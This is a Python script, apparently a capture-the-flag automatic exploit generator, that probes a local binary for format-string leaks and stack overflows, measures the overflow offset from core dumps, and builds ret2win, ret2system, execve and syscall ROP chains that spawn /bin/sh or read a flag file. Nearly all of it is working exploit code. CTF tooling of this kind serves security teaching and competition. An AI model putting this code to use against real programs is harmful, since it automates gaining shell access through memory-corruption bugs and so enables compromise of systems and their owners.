from pwn import *
import os, subprocess, re, sys
import angr, angrop

class AEG:
	def __init__(self, filepath):
		self.file = filepath
		self.elf = ELF(filepath)
		self.rop = ROP(self.elf)
		self.funcs = self.elf.sym.keys()

	def analyze_funcs(self):
		print('ANALYZING FUNCTIONS...')
		# Check for tell of a ROP problem - presence of a symbol named gadget
		self.has_gadget = False
		self.has_printf = False
		self.can_overflow = False
		self.can_leak = False
		#self.has_win = False
		for f in self.funcs:
			srch = re.search(r"gadget", f)
			if srch != None:
				print('Found a hardcoded gadget:', f)
				self.has_gadget = True
			if f == 'printf':
				print('Found a call to printf:', f)
				self.has_printf = True
			if f == 'gets':
				#print('Found a win() function:', f)
				self.can_overflow = True

	# Look at Input/Output 
	def analyze_IO(self):
		p = process(self.file)
		self.num_inputs = 0
		self.input_exploits = dict()
		# This will find number of inputs, and look for any printf leaks
		while(p.poll() == None):
			if p.can_recv(timeout=1):
				try:
					line = p.recv().decode()
				except EOFError:
					continue
				srch = re.search(r'0x[0-9a-f]+', line)
				if srch != None:
					print(f'Leak Found!: {line}')
					self.can_leak = True
					i = self.num_inputs
					# Record that this input can be attacked with print format bug
					if i in self.input_exploits.keys():
						self.input_exploits[i].append('leak')
					else:
						self.input_exploits[i] = ['leak']
						
				
			else:
				self.num_inputs += 1
				if self.has_printf:
					p.sendline('%p %p %p')
				else:
					p.sendline('a')

		# Now check for buffer overflows on each input
		for i in range(self.num_inputs):
			p.close()
			p.kill()
			p = process(self.file)
			curr_input = 0
			checked_input = False
			while p.poll() == None and checked_input==False:
				
				if p.can_recv(timeout=1):
					try:
						p.recv()
					except EOFError:
						continue
				else:
					# Only test one input at a time
					if curr_input != i:
						p.sendline('a')
						curr_input += 1
					else:
						checked_input = True
						# Send in cyclic pattern and check for overflow
						p.sendline(cyclic(1024, n=8))
						p.wait()
						try:
							core = p.corefile
						except:
							continue
						p.close()
						if core == None:	# No core dump means no overflow
							continue
						os.remove(core.file.name)
						padding = cyclic_find(core.read(core.rsp, 8), n=8)
						if padding == -0x1:
							# If rsp didn't give us the overflow for whatever reason, check rbp
							padding = cyclic_find(core.read(core.rbp, 8), n=8) # + 8
							# If padding is still -0x1, then there is no overflow on this input
							if padding == -0x1:
								continue
							else:
								padding += 8	# add 8 to increment from rbp to return address
						# If we reach here, we found an overflow
						j = i+1
						if j in self.input_exploits.keys():
							self.input_exploits[j].append(f'overflow:{padding}')
						else:
							self.input_exploits[j] = [f'overflow:{padding}']
		# Close and kill process
		p.close()
		p.kill()				

		
	# This function will use all the information we gathered to determine which exploit to call
	def determine_exploit(self):
		self.exploit = b''
		# If only one attackable input:
		if len(self.input_exploits) == 1:
			# Get which input is attackable
			num = list(self.input_exploits.keys())[0]
			for attack in self.input_exploits[num]:
				srch = re.search(r'overflow:([0-9]+)', attack)
				if srch != None:
					padding = int(srch.group(1))
					# ret2win problem
					if 'win' in self.funcs:
						log.info('CRAFTING RET2WIN EXPLOIT')
						self.ret2win(num, padding)

					# ret2system problem
					elif 'system' in self.funcs:
						log.info('CRAFTING RET2SYSTEM EXPLOIT')
						self.ret2system(num, padding)

					# execve problem
					elif 'execve' in self.funcs:
						log.info('CRAFTING RET2EXECVE EXPLOIT')
						self.ret2execve(num, padding)

					elif 'syscall' in self.funcs:
						log.info('CRAFTING SYSCALL EXPLOIT')
						self.syscall_rop(num, padding)

	# Smash stack and change return address to win()
	def ret2win(self, vuln_input, padding):
		# Craft the exploit
		self.exploit = b'a'*padding + p64(self.elf.sym['win'])
		self.send_rop(vuln_input)


	# ROP exploit where we call system('/bin/sh') or system('cat flag.txt')
	def ret2system(self, vuln_input, padding):
		system = p64(self.elf.sym['system'])
		# Search for '/bin/sh' or 'cat flag.txt' in our binary
		targ_str = self.search_elf([b'/bin/sh\x00', b'cat flag.txt\x00'])
		# If we found one of these strings, we don't need to make it. Look for pop_rdi gadget
		if targ_str != -1:
			pop_rdi = p64(self.rop.find_gadget(['pop rdi', 'ret'])[0])
			if pop_rdi:
				self.exploit = b'a'*padding + pop_rdi + p64(targ_str) + system

		# Otherwise, have to write '/bin/sh' into the binary
		else:
			data_section = self.elf.get_section_by_name(".data").header.sh_addr
			print(hex(data_section))
			angr_p = angr.Project(self.file)
			angr_rop = angr_p.analyses.ROP()
			angr_rop.find_gadgets_single_threaded()
			# Craft the chain & exploit
			chain = angr_rop.write_to_mem(data_section, b"/bin/sh\x00") + angr_rop.set_regs(rdi=data_section)
			self.exploit = b'a'*padding + chain.payload_str() + system
		# Fire off exploit
		self.send_rop(vuln_input)

			
	# ROP exploit where we call execve('/bin/sh', 0, 0) or execve('cat flag.txt', 0, 0)				
	def ret2execve(self, vuln_input, padding):
		log.info('CRAFTING EXPLOIT')
		execve = p64(self.elf.sym['execve'])
		# Search for '/bin/sh' or 'cat flag.txt' in our binary
		targ_str = self.search_elf([b'/bin/sh\x00',  b'cat flag.txt\x00'])
		# If we found the target string, don't have to make it. Find pop rdi, pop rsi, and pop rdx gadgets
		if targ_str != -1:
			# Try to find gadgets with pwntools first (for speed)
			try:
				pop_rdi = p64(self.rop.find_gadget(['pop rdi', 'ret'])[0])
				pop_rsi = p64(self.rop.find_gadget(['pop rsi', 'ret'])[0])
				pop_rdx = p64(self.rop.find_gadget(['pop rdx','pop rdi', 'ret'])[0])
				self.exploit = b'a'*padding + pop_rdi + p64(targ_str) 
				self.exploit += pop_rsi + p64(0) + pop_rdx + p64(0)
				self.exploit += execve
			# Sometimes gadgets are weirdly ordered, so use angr if above didn't work
			except:
				print("Use angrop instead")
				proj = angr.Project(self.file)
				arop = proj.analyses.ROP()
				arop.find_gadgets_single_threaded()
				chain = arop.set_regs(rdi=targ_str, rsi=0, rdx=0)
				self.exploit = b'a'*padding + chain.payload_str()
				self.exploit += execve
		# Account for having to write to memory
		else:
			data_section = self.elf.get_section_by_name(".data").header.sh_addr
			angr_p = angr.Project(self.file)
			angr_rop = angr_p.analyses.ROP()
			angr_rop.find_gadgets_single_threaded()
			# Craft the chain and exploit
			chain = angr_rop.write_to_mem(data_section, b"/bin/sh\x00")
			chain += angr_rop.set_regs(rdi=data_section, rsi=0, rdx=0)
			self.exploit = b'a'*padding + chain.payload_str() + execve
		# Fire off exploit
		self.send_rop(vuln_input)

	# Generate ROP chain for calling syscall
	def syscall_rop(self, vuln_input, padding):
		log.info('CRAFTING SYSCALL EXPLOIT')
		# Search for '/bin/sh' or 'cat flag.txt' in our binary
		targ_str = self.search_elf([b'/bin/sh\x00', b'cat flag.txt\x00'])
		# If found, get pop gadgets
		if targ_str != -1:
			proj = angr.Project(self.file)
			arop = proj.analyses.ROP()
			arop.find_gadgets_single_threaded()
			chain = arop.set_regs(rax=59, rdi=targ_str, rsi=0, rdx=0)
			self.exploit = b'a'*padding + chain.payload_str()
			self.exploit += p64(self.rop.find_gadget(['syscall'])[0])
		# Otherwise, we have to write the string into the binary
		else:
			print('Have to make the string')
			data_section = self.elf.get_section_by_name(".data").header.sh_addr
			angr_p = angr.Project(self.file)
			angr_rop = angr_p.analyses.ROP()
			angr_rop.find_gadgets_single_threaded()
			# Craft the chain and exploit
			chain = angr_rop.write_to_mem(data_section, b"/bin/sh\x00")
			chain += angr_rop.set_regs(rax=59, rdi=data_section, rsi=0, rdx=0)
			self.exploit = b'a'*padding + chain.payload_str()
			self.exploit += p64(self.rop.find_gadget(['syscall'])[0])
			
		# Fire off exploit
		self.send_rop(vuln_input)

	# Print analysis to the screen
	def get_analysis(self):
		print(f'ROP: {self.has_gadget}')
		print(f'String format bug: {self.has_printf}')
		print(f'Number of inputs: {self.num_inputs}')
		print(f'Input Attack Vectors: {self.input_exploits}')

	# Search ELF file for any of a list of strings, return address or -1 if not found
	def search_elf(self, list_str):
		target = -1
		for s in list_str:
			if len(list(self.elf.search(s))) > 0:
				target = next(self.elf.search(s))
				return target
		# If we reach here, then we didn't find any of the strings
		return -1

	# This function will send ret2win or basic ROP exploit
	def send_rop(self, vuln_input):
		curr_input = 1
		p = process(self.file)
		# Step through program and wait for vulnerable input
		while p.poll() == None:
			if p.can_recv(timeout=1):
				try:
					p.recv()
				except EOFError:
					return
			else:
				# Send exploit and switch to interactive
				if curr_input == vuln_input:
					p.sendline(self.exploit)
					p.interactive()
					p.close()
					p.kill()
					return
				else:
					p.sendline(b'a')
					curr_input += 1
		# In case, close and kill the process
		p.close()
		p.kill()

try:
	solver = AEG(args.BIN)

except FileNotFoundError:
	print("FileNotFoundError")
	print('Pass in a binary to exploit: python3 solarpanth3r.py BIN=<binary>')
	sys.exit()

solver.analyze_funcs()
solver.analyze_IO()
solver.get_analysis()
solver.determine_exploit()


